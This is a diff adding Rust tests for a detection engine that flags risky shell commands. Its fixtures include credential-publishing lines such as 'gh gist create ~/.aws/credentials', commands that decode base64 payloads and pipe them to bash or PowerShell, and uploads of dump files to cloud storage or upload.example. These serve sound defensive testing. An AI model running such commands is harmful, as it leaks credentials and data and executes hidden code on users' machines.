@@ -164,6 +164,33 @@ fn cloud_credentials_match_access_not_cli_authentication() {
 }
 
 #[test]
+fn github_cli_publication_of_a_cloud_credential_file_is_harvest() {
+    assert_matches(
+        "credential.cloud_harvest",
+        "command",
+        &[
+            "gh gist create ~/.aws/credentials",
+            "gh gist create --public notes.md ~/.kube/config",
+            "gh gist create -d backup ~/.docker/config.json",
+            "gh issue comment 1 --body-file ~/.aws/credentials",
+            "gh issue comment 1 --body-file=~/.aws/credentials",
+            "gh pr comment 7 -F ~/.config/gcloud/credentials.db",
+            "gh pr comment 7 -F\"$HOME/.aws/credentials\"",
+        ],
+        &[
+            "gh gist list",
+            "gh gist view 1234abcd",
+            "gh gist create README.md",
+            "gh gist create docs/setup.md config.example.json",
+            "gh issue comment 1 --body \"rotated the keys\"",
+            "gh issue comment 1 --body-file notes.md",
+            "gh pr create --title Fix --body-file docs/pr-body.md",
+            "gh pr comment 7 --body \"see the credentials section\"",
+        ],
+    );
+}
+
+#[test]
 fn dns_encoding_requires_encoded_data_sent_to_a_lookup() {
     assert_matches(
         "exfil.dns_encoding",
@@ -489,5 +516,186 @@ fn private_key_read_excludes_public_key_suffix() {
             "-----BEGIN OPENSSH PRIVATE KEY-----",
         ],
         &["id_rsa.pub", "id_ed25519.pub"],
+    );
+}
+
+#[test]
+fn encoded_payload_requires_an_observable_execution_step() {
+    assert_matches(
+        "execution.encoded_payload",
+        "command",
+        &[
+            "echo U1lOVEhFVElD | base64 --decode | bash",
+            "base64 -d payload.b64 | sh -s -- --flag",
+            "base64 -d payload.b64 | gunzip | sudo /bin/bash",
+            "cat payload.b64 | base64 -d | python3 -",
+            "eval \"$(echo U1lOVEhFVElD | base64 -d)\"",
+            "bash -c \"$(base64 --decode payload.b64)\"",
+            "bash <(base64 -d payload.b64)",
+            "source <(base64 -d payload.b64)",
+            "iex ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($s)))",
+            "base64 -d payload.b64 > /tmp/run.sh && bash /tmp/run.sh",
+            "base64 -d payload.b64 > /tmp/tool; chmod +x /tmp/tool; /tmp/tool",
+            "base64 -d payload.b64 2>&1 | sh",
+            "p=$(echo U1lOVEhFVElD | base64 -d); eval \"$p\"",
+            "base64 -d payload.b64 > run.py && python3 run.py",
+            "base64 -d payload.b64 > run.ps1; pwsh -File run.ps1",
+            "echo U1lOVEhFVElD | base64 -d | bash 2>/dev/null",
+            "echo U1lOVEhFVElD | base64 -d | sh >/tmp/log",
+            "echo U1lOVEhFVElD | base64 -d | bash -s stable",
+            "echo U1lOVEhFVElD | base64 -d | sudo -E bash",
+            "echo U1lOVEhFVElD | base64 -d | fish",
+            "echo U1lOVEhFVElD | base64 -d | php",
+            "echo U1lOVEhFVElD | base64 -d | python3 2>/dev/null",
+            "fish -c \"$(base64 -d payload.b64)\"",
+            "base64 -d payload.b64 > /tmp/p; /tmp/p",
+            "base64 -d payload.b64 > p.sh && chmod +x p.sh && ./p.sh",
+            "certutil -decode cert.b64 cert.cer",
+            "certutil -decode a.b64 a.exe && a.exe",
+            "certutil -decode a.b64 a.exe & start a.exe",
+            "certutil.exe -decode a.b64 a.ps1 && powershell -File a.ps1",
+            "echo U1lOVEhFVElD | base64 -d | env bash",
+            "echo U1lOVEhFVElD | base64 -d | /usr/bin/env bash",
+            "base64 -d payload.b64 | doas sh",
+            "[System.Reflection.Assembly]::Load([Convert]::FromBase64String($b))",
+            "[scriptblock]::Create([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b)))",
+            "base64 -d payload.b64 > p.sh & bash p.sh",
+            "base64 -d -o /tmp/p.sh payload.b64 && sh /tmp/p.sh",
+        ],
+        &[
+            "base64 --decode documented-fixture.b64",
+            "base64 -d fixture.b64 > fixture.bin",
+            "echo eyJhIjoxfQ== | base64 -d | python3 -m json.tool",
+            "echo eyJhIjoxfQ== | base64 -d | jq .",
+            "base64 -d key.b64 > id_fixture && chmod 600 id_fixture",
+            "echo $KEYSTORE | base64 -d > release.jks && ./gradlew assembleRelease",
+            "[IO.File]::WriteAllBytes('a.bin', [Convert]::FromBase64String($s))",
+            "base64 -d data.b64 > data.json && jq . data.json",
+            "echo eyJhIjoxfQ== | base64 -d | node script.js",
+            "echo eyJhIjoxfQ== | base64 -d | shasum",
+            "echo eyJhIjoxfQ== | base64 -d | shuf",
+            "echo $CA | base64 -d > ca.pem && node server.js",
+            "echo $CA | base64 -d > ca.pem && python manage.py runserver",
+            "openssl enc -aes-256-cbc -in a -out a.enc && sh deploy.sh",
+            "base64 -d data 2>/dev/null; source venv/bin/activate",
+            "base64 -d ca.b64 > ca.pem && chmod 600 ca.pem",
+            "echo eyJhIjoxfQ== | base64 -d | python3 -c \"import sys,json;print(json.load(sys.stdin))\"",
+            "echo eyJhIjoxfQ== | base64 -d | node -e \"process.stdin.pipe(process.stdout)\"",
+            "echo eyJhIjoxfQ== | base64 -d | ruby -e 'puts STDIN.read'",
+            "echo eyJhIjoxfQ== | base64 -d | php -r 'echo 1;'",
+            "echo eyJhIjoxfQ== | base64 -d | perl -ne 'print'",
+            "echo $K | base64 -d > ~/.ssh/id_rsa && chmod 600 ~/.ssh/id_rsa && ./deploy.sh",
+            "echo $K | base64 -d > deploy.ssh/key && bash scripts/push.sh",
+            "base64 -d data 2>/tmp/err.log; python app.py",
+        ],
+    );
+}
+
+#[test]
+fn every_decode_is_a_zero_point_timeline_mark() {
+    let rules = bundled();
+    let result = rules
+        .evaluate(&[("command", "base64 --decode documented-fixture.b64")])
+        .expect("evaluate")
+        .expect("match");
+    assert_eq!(result.rule_ids, ["obfuscation.decode"]);
+    assert_eq!(result.score, 0);
+    assert_eq!(
+        rule_ids(
+            &rules,
+            "command",
+            "echo U1lOVEhFVElD | base64 --decode | bash"
+        ),
+        [
+            "execution.shell",
+            "execution.encoded_payload",
+            "obfuscation.decode",
+            "chain.shell_encoded_payload"
+        ]
+    );
+    // Every certutil spelling that scores as a decode also marks it.
+    assert_matches(
+        "obfuscation.decode",
+        "command",
+        &[
+            "certutil -decode documented.b64 documented.cer",
+            "certutil.exe -decode documented.b64 documented.cer",
+            "certutil -f /decode documented.b64 documented.cer",
+        ],
+        &["certutil -urlcache -split -f https://example.invalid/a a"],
+    );
+}
+
+#[test]
+fn object_storage_copy_counts_only_local_to_remote_uploads() {
+    assert_matches(
+        "exfil.outbound_upload",
+        "command",
+        &[
+            "aws s3 cp dump.sql s3://synthetic-bucket/",
+            "aws s3 cp --recursive ./dist s3://synthetic-bucket/site/ --acl private",
+            "tar czf - . | aws s3 cp - s3://synthetic-bucket/repo.tgz",
+            "gsutil cp build.tar gs://synthetic-bucket/",
+            "rclone copy ./reports synthetic-remote:archive",
+            "az storage blob upload --container-name c --name n --file dump.sql",
+            "az storage blob upload-batch --destination c --source ./dist",
+            "aws s3 cp --profile fixture dump.sql s3://synthetic-bucket/",
+            "aws s3 cp --region=us-east-1 dump.sql s3://synthetic-bucket/",
+            "aws s3 cp C:\\data\\dump.sql s3://synthetic-bucket/",
+            "aws s3 cp --endpoint-url https://storage.example:9000 ./dump.sql s3://synthetic-bucket/k",
+            "gsutil cp file:///home/user/dump.sql gs://synthetic-bucket/x",
+            "rclone copy ./reports :s3,env_auth:synthetic-bucket",
+            "az storage blob  upload -f dump.sql -c c --account-name acct",
+            "az storage blob \"upload\" -f dump.sql -c c",
+            "az storage blob directory upload -c c -s ./dist -d site",
+            "az storage blob sync -s ./dist -c c",
+            "az storage file upload -s share --source ./dump.sql",
+            "az storage file upload-batch --destination share --source ./dist",
+            "az storage fs file upload -s ./dump.sql -f fs -p p",
+            "az storage fs directory upload -f fs -s ./dist",
+            "az storage copy -s ./reports -d https://acct.blob.core.windows.net/c",
+            "az storage copy --source=C:\\reports --destination https://acct.blob.core.windows.net/c",
+            "aws s3 cp --sse aws:kms ./dump.sql s3://synthetic-bucket/k",
+            "aws s3 cp --sse-kms-key-id arn:aws:kms:us-east-1:1:key/x ./dump.sql s3://synthetic-bucket/k",
+            "aws s3 cp --expires 2030-01-01T00:00:00Z ./dump.sql s3://synthetic-bucket/k",
+            "rclone copy --header-upload \"Cache-Control:no-cache\" ./reports synthetic-remote:archive",
+            "rclone copy --bwlimit 08:00,512k ./reports synthetic-remote:archive",
+            "az storage copy -s id_rsa -d https://acct.blob.core.windows.net/c",
+        ],
+        &[
+            "aws s3 cp s3://synthetic-bucket/a ./a",
+            "aws s3 cp s3://synthetic-bucket/a -",
+            "aws s3 cp s3://synthetic-bucket/a ./a 2>&1",
+            "gsutil cp gs://synthetic-bucket/a.tar .",
+            "rclone copy synthetic-remote:archive ./reports",
+            "rclone copy :s3,env_auth:synthetic-bucket ./reports",
+            "aws s3 cp s3://synthetic-bucket/a s3://other-bucket/a",
+            "aws s3 cp s3://synthetic-bucket/a ./b --profile fixture",
+            "az storage account list",
+            "az storage account update -n acct",
+            "az storage container list --account-name acct",
+            "az storage blob download --container-name c --name n --file dump.sql",
+            "az storage blob url -c c -n x",
+            "az storage blob update -c c -n x",
+            "az storage copy -s https://acct.blob.core.windows.net/c/x -d ./x",
+            "aws s3 cp s3://synthetic-bucket/a ./a &",
+            "gsutil cp gs://synthetic-bucket/a.tar . &",
+            "rclone copyto synthetic-remote:archive/a ./a",
+        ],
+    );
+}
+
+#[test]
+fn a_backgrounded_command_does_not_hide_a_later_upload() {
+    assert_matches(
+        "exfil.outbound_upload",
+        "command",
+        &[
+            "aws s3 cp s3://synthetic-bucket/x /tmp/x & curl -T dump.sql https://upload.example",
+            "az storage blob list -c c & curl -d @dump.sql https://upload.example",
+            "rclone copy synthetic-remote:archive ./reports & curl -T dump.sql https://upload.example",
+            "aws s3 cp s3://synthetic-bucket/x /tmp/x & aws s3 cp ./dump.sql s3://synthetic-bucket/k",
+        ],
+        &[],
     );
 }
